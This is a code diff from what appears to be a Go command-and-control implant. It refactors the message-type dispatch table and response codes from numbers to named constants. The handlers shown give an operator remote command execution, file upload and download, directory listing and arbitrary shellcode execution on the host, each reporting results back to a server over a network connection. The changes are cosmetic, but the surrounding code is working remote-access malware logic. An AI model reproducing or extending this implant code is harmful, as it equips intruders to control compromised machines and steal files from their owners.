@@ -8,16 +8,16 @@ import (
 )
 
 var MessageTypeToFunc = map[int]func(net.Conn, interface{}){
-	5: handleImplantKillReq,
-	7: handleImplantConfigReq,
+	communication.IMPLANT_KILL_REQ:   handleImplantKillReq,
+	communication.IMPLANT_CONFIG_REQ: handleImplantConfigReq,
 	//reserved for implant functionality
-	11: handleFileInfoReq,
-	13: handleLsReq,
-	15: handleExecReq,
-	17: handleCdReq,
-	19: handleDownloadReq,
-	21: handleUploadReq,
-	23: handleShellcodeExecReq,
+	communication.FILE_INFO_REQ:      handleFileInfoReq,
+	communication.LS_REQ:             handleLsReq,
+	communication.EXEC_REQ:           handleExecReq,
+	communication.CD_REQ:             handleCdReq,
+	communication.DOWNLOAD_REQ:       handleDownloadReq,
+	communication.UPLOAD_REQ:         handleUploadReq,
+	communication.SHELLCODE_EXEC_REQ: handleShellcodeExecReq,
 }
 
 func handleImplantConfigReq(conn net.Conn, arguments interface{}) {
@@ -40,7 +40,7 @@ func handleImplantConfigReq(conn net.Conn, arguments interface{}) {
 	}
 
 	resp := communication.ImplantConfigResp{TaskId: ImplantConfigReq.TaskId, Success: true}
-	SendEnvelopeToServer(conn, 8, resp)
+	SendEnvelopeToServer(conn, communication.IMPLANT_CONFIG_RESP, resp)
 }
 
 func handleImplantKillReq(conn net.Conn, arguments interface{}) {
@@ -50,7 +50,7 @@ func handleImplantKillReq(conn net.Conn, arguments interface{}) {
 	}
 	shouldTerminate = true
 	resp := communication.ImplantKillResp{ImplantId: implantId, TaskId: implantKillReq.TaskId}
-	SendEnvelopeToServer(conn, 6, resp)
+	SendEnvelopeToServer(conn, communication.IMPLANT_KILL_RESP, resp)
 }
 
 func handleFileInfoReq(conn net.Conn, arguments interface{}) {
@@ -63,7 +63,7 @@ func handleFileInfoReq(conn net.Conn, arguments interface{}) {
 		SendErrorToServer(conn, fileInfoReq.TaskId, err)
 	} else {
 		resp := communication.FileInfoResp{TaskId: fileInfoReq.TaskId, Name: results.Name(), Size: results.Size(), Mode: results.Mode().String(), ModTime: int(results.ModTime().Unix()), IsDir: results.IsDir()}
-		SendEnvelopeToServer(conn, 12, resp)
+		SendEnvelopeToServer(conn, communication.FILE_INFO_RESP, resp)
 	}
 }
 
@@ -77,7 +77,7 @@ func handleLsReq(conn net.Conn, arguments interface{}) {
 		SendErrorToServer(conn, lsReq.TaskId, err)
 	} else {
 		resp := communication.LsResp{TaskId: lsReq.TaskId, Result: results}
-		SendEnvelopeToServer(conn, 14, resp)
+		SendEnvelopeToServer(conn, communication.LS_RESP, resp)
 	}
 }
 
@@ -91,7 +91,7 @@ func handleExecReq(conn net.Conn, arguments interface{}) {
 		SendErrorToServer(conn, execReq.TaskId, err)
 	} else {
 		resp := communication.ExecResp{TaskId: execReq.TaskId, Output: string(result)}
-		SendEnvelopeToServer(conn, 16, resp)
+		SendEnvelopeToServer(conn, communication.EXEC_RESP, resp)
 	}
 }
 
@@ -105,7 +105,7 @@ func handleCdReq(conn net.Conn, arguments interface{}) {
 		SendErrorToServer(conn, cdReq.TaskId, err)
 	} else {
 		resp := communication.CdResp{TaskId: cdReq.TaskId, Success: true}
-		SendEnvelopeToServer(conn, 18, resp)
+		SendEnvelopeToServer(conn, communication.CD_RESP, resp)
 	}
 }
 
@@ -119,7 +119,7 @@ func handleDownloadReq(conn net.Conn, arguments interface{}) {
 		SendErrorToServer(conn, downloadReq.TaskId, err)
 	} else {
 		resp := communication.DownloadResp{TaskId: downloadReq.TaskId, Contents: contents}
-		SendEnvelopeToServer(conn, 20, resp)
+		SendEnvelopeToServer(conn, communication.DOWNLOAD_RESP, resp)
 	}
 }
 
@@ -133,7 +133,7 @@ func handleUploadReq(conn net.Conn, arguments interface{}) {
 		SendErrorToServer(conn, UploadReq.TaskId, err)
 	} else {
 		resp := communication.UploadResp{TaskId: UploadReq.TaskId, Success: true}
-		SendEnvelopeToServer(conn, 22, resp)
+		SendEnvelopeToServer(conn, communication.UPLOAD_RESP, resp)
 	}
 }
 
@@ -145,5 +145,5 @@ func handleShellcodeExecReq(conn net.Conn, arguments interface{}) {
 
 	modules.ShellcodeExec(shellcodeExecReq.Shellcode)
 	resp := communication.ShellcodeExecResp{TaskId: shellcodeExecReq.TaskId, Success: true}
-	SendEnvelopeToServer(conn, 24, resp)
+	SendEnvelopeToServer(conn, communication.SHELLCODE_EXEC_RESP, resp)
 }
